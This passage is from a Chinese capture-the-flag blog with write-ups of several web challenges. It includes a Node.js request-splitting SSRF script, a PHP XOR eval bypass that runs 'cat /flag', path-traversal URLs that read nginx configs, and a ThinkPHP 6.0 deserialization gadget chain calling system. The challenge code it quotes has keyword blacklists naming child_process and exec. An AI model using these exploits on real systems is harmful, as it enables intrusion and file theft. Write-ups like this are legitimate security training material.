punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;error&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;message&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;error&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;error&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;search param &#39;q&#39; missing!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;/core&lt;/code&gt;  定义一个接受查询参数（）的路由（ ）  &lt;code&gt;q&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;使用构造一个 URL  &lt;code&gt;q&lt;/code&gt; ，并根据可能表明恶意的关键字黑名单进行检查。&lt;/p&gt;
&lt;p&gt;如果黑名单检查通过，它会对构造的 URL 执行 HTTP GET 请求并返回响应。否则，它会发送错误消息。&lt;/p&gt;
&lt;p&gt;blacklist 函数功能：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function blacklist(url) &amp;#123;
    var evilwords = [&amp;quot;global&amp;quot;, &amp;quot;process&amp;quot;, &amp;quot;mainModule&amp;quot;, &amp;quot;require&amp;quot;, &amp;quot;root&amp;quot;, &amp;quot;child_process&amp;quot;, &amp;quot;exec&amp;quot;, &amp;quot;\&amp;quot;&amp;quot;, &amp;quot;&#39;&amp;quot;, &amp;quot;!&amp;quot;];
    var arrayLen = evilwords.length;
    for (var i = 0; i &amp;lt; arrayLen; i++) &amp;#123;
        const trigger = url.includes(evilwords[i]);
        if (trigger === true) &amp;#123;
            return true;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;用于检查 URL 是否包含与潜在恶意行为相关的任何关键字。如果发现任何关键字，则返回 &lt;code&gt;true&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;nodejs 在版本号小于 8.x 的时候存在 unicode 字符损坏导致的漏洞，而这个题目的版本刚好对的上（但是 buu 上的这个题并没有说版本），简单来说就是 Unicode 在解析的时候由于解码的类型问题导致部分被截断，字符出现变形，而原字符并非会被转义的危险字符造成的安全漏洞，具体就是先知社区这篇文章&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjg5NCN0b2MtMg==&#34;&gt; https://xz.aliyun.com/t/2894#toc-2&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;构造：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;所以构造一下payload，通过换行符使得服务器在core中发出的一次http请求变成两次，并且第二次请求内容我们完全可控
可以先去upload目录上传文件抓一个包作为文件上传的模板
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参考脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import urllib.parse
import requests

payload = &#39;&#39;&#39; HTTP/1.1
Host: f
Connection: keep-alive

POST /file_upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryO9LPoNAg9lWRUItA
Content-Length: &amp;#123;&amp;#125;
cache-control: no-cache
X-Forwarded-For: 127.0.0.1
Connection: keep-alive 

&amp;#123;&amp;#125;&#39;&#39;&#39;
body=&#39;&#39;&#39;------WebKitFormBoundaryO9LPoNAg9lWRUItA
Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;lmonstergg.pug&amp;quot;
Content-Type: ../template

doctype html
html
  head
    style
      include ../../../../../../../flag.txt
------WebKitFormBoundaryO9LPoNAg9lWRUItA--
&#39;&#39;&#39;
more=&#39;&#39;&#39;

GET /flag HTTP/1.1
Host: f
Connection: close
f:&#39;&#39;&#39;
payload = payload.format(len(body)+10,body)+more
print(payload)
payload = payload.replace(&amp;quot;\n&amp;quot;, &amp;quot;\r\n&amp;quot;)

payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
print(&#39;                                       &#39;)
print(payload)


session = requests.Session()
session.trust_env = False
session.get(&#39;http://668981f4-ba71-4a2c-bc99-267eb35d24f0.node5.buuoj.cn:81/core?q=&#39; + urllib.parse.quote(payload))
response = session.get(&#39;http://668981f4-ba71-4a2c-bc99-267eb35d24f0.node5.buuoj.cn:81/?action=lmonstergg&#39;)
print(response.text)
&lt;/code&gt;&lt;/pre&gt;

 &lt;h2 id=&#34;rootersctf2019imgxweb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rootersctf2019imgxweb&#34;&gt;#&lt;/a&gt; [RootersCTF2019]ImgXweb&lt;/h2&gt;
&lt;h2 id=&#34;6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/6.png&#34; alt=&#34;6&#34;&gt;&lt;/h2&gt;
&lt;p&gt;注册登录在 / Home 这里发现 cookie，感觉是 jwt，直接上传&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qd3QuaW8v&#34;&gt; JSON Web Tokens - jwt.io&lt;/span&gt;&lt;img data-src=&#34;../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;要有密码才能修改：信息搜集发现 robots.txt：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现密码 you-will-never-guess&lt;/p&gt;
&lt;p&gt;修改 user 名为 admin：换 jwt 发现有了 flag.png&lt;/p&gt;
&lt;p&gt;可以直接搞一个 curl（抓包也可以）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;

 &lt;h2 id=&#34;nestctf2019lovemath2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nestctf2019lovemath2&#34;&gt;#&lt;/a&gt; [NESTCTF2019]LoveMath2&lt;/h2&gt;
&lt;p&gt;源码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET[&#39;c&#39;]))&amp;#123;
    show_source(__FILE__);
&amp;#125;else&amp;#123;
    //例子 c=20-1
    $content = $_GET[&#39;c&#39;];
    if (strlen($content) &amp;gt;= 60) &amp;#123;
        die(&amp;quot;太长了不会算&amp;quot;);
    &amp;#125;
    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&amp;quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
    foreach ($blacklist as $blackitem) &amp;#123;
        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) &amp;#123;
            die(&amp;quot;请不要输入奇奇怪怪的字符&amp;quot;);
        &amp;#125;
    &amp;#125;
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;,  &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39; , &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);
    foreach ($used_funcs[0] as $func) &amp;#123;
        if (!in_array($func, $whitelist)) &amp;#123;
            die(&amp;quot;请不要输入奇奇怪怪的函数&amp;quot;);
        &amp;#125;
    &amp;#125;
    //帮你算出答案
    eval(&#39;echo &#39;.$content.&#39;;&#39;);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;之前有一道 Love math 解法一样，直接放 payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&amp;#123;0&amp;#125;($pi&amp;#123;1&amp;#125;)&amp;amp;0=system&amp;amp;1=cat%20/flag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;解释&lt;br&gt;
 (is_nan&lt;sup&gt;(6).(4)).(tan&lt;/sup&gt; (1).(5)) 结果是_GET&lt;br&gt;
&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;G&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mtext&gt;，&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;pi=_GET，&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.85396em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;G&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;pi=&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.85396em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET&lt;br&gt;
php 中，get 方法的 [] 可以用 {} 替代，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;pi{0}(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;pi {1}) 即&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;G&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_GET{0}(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;G&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET {1}) 总的来看就是 system (cat /flag)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$payload = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;,  &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39; , &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
for($k=1;$k&amp;lt;=sizeof($payload);$k++)&amp;#123;
    for($i = 0;$i &amp;lt; 9; $i++)&amp;#123;
        for($j = 0;$j &amp;lt;=9;$j++)&amp;#123;
            $exp = $payload[$k] ^ $i.$j;
            echo($payload[$k].&amp;quot;^$i$j&amp;quot;.&amp;quot;==&amp;gt;$exp&amp;quot;);
            echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZteXl5MS9hcnRpY2xlL2RldGFpbHMvMTE3MDkwMDAx&#34;&gt;https://blog.csdn.net/fmyyy1/article/details/117090001&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;virink_2019_files_share&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#virink_2019_files_share&#34;&gt;#&lt;/a&gt; virink_2019_files_share&lt;/h2&gt;
&lt;h2 id=&#34;4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/4.png&#34; alt=&#34;4&#34;&gt;&lt;/h2&gt;
&lt;p&gt;进来就是 js 小游戏，没有什么提示说还原后才给 flag，所以可以直接信息搜集&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;
	&amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
	&amp;lt;title&amp;gt;The Cube&amp;lt;/title&amp;gt;
	&amp;lt;meta name=&amp;quot;viewport&amp;quot;
		content=&amp;quot;width=device-width,height=device-height,user-scalable=no,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0&amp;quot;&amp;gt;
	&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/static/style.css&amp;quot;&amp;gt;
	&amp;lt;link rel=&amp;quot;icon&amp;quot; href=&amp;quot;/uploads/favicon.ico&amp;quot; type=&amp;quot;image/x-icon&amp;quot; /&amp;gt;
	&amp;lt;!-- Hint : flag in f1ag_Is_h3re --&amp;gt;
	&amp;lt;!-- 趣味题，真的是为了出题而出题的，别打我。 By Virink --&amp;gt;
&amp;lt;/head&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现提示进去看看。&lt;img data-src=&#34;../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;任意文件读取（双写绕过过滤）：由于是使用 OpenResty，尝试包含 nginx 的配置文件，默认是 /etc/nginx/conf.d/default.conf&lt;br&gt;
 尝试访问后发现过滤了…/, 所以使用双写绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/preview?f=....//....//....//....//....//....//....//etc..//nginx..//conf.d..//default.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后根据提示访问 flag 文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/preview?f=....//....//....//....//....//....//....//f1ag_Is_h3re..//flag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%5DEasyphp2/6.png&#34; alt=&#34;6&#34;&gt; 参考链接：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjYzOTUxL2FydGljbGUvZGV0YWlscy8xMTk1OTkzNjg=&#34;&gt;https://blog.csdn.net/qq_46263951/article/details/119599368&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;安洵杯-2019iamthinking&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安洵杯-2019iamthinking&#34;&gt;#&lt;/a&gt; [安洵杯 2019] iamthinking&lt;/h2&gt;
&lt;h2 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Diamthinking/1.png&#34; alt=&#34;1&#34;&gt;&lt;/h2&gt;
&lt;p&gt;dirsearch 搜集到 www.zip 文件：&lt;/p&gt;
&lt;p&gt;发现是 thinkphp6.0 版本：&lt;/p&gt;
&lt;p&gt;thinkphp6.0 有两个计较明显的漏洞：&lt;br&gt;
一个文件上传：要开启 session（本题没开）&lt;/p&gt;
&lt;p&gt;一个就是反序列化：本体有个 unserilize 函数&lt;/p&gt;
&lt;p&gt;那就是反序列化了&lt;/p&gt;
&lt;p&gt;php 脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

namespace think\model\concern;

trait Attribute
&amp;#123;
    private $data = [&amp;quot;key&amp;quot; =&amp;gt; [&amp;quot;key1&amp;quot; =&amp;gt; &amp;quot;cat /flag&amp;quot;]];
    private $withAttr = [&amp;quot;key&amp;quot;=&amp;gt;[&amp;quot;key1&amp;quot;=&amp;gt;&amp;quot;system&amp;quot;]];
    protected $json = [&amp;quot;key&amp;quot;];
&amp;#125;
namespace think;

abstract class Model
&amp;#123;
    use model\concern\Attribute;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $jsonAssoc;
    function __construct($obj = &#39;&#39;)
    &amp;#123;
        $this-&amp;gt;lazySave = true;
        $this-&amp;gt;withEvent = false;
        $this-&amp;gt;exists = true;
        $this-&amp;gt;force = true;
        $this-&amp;gt;table = $obj;
        $this-&amp;gt;jsonAssoc = true;
    &amp;#125;
&amp;#125;

namespace think\model;

use think\Model;

class Pivot extends Model
&amp;#123;
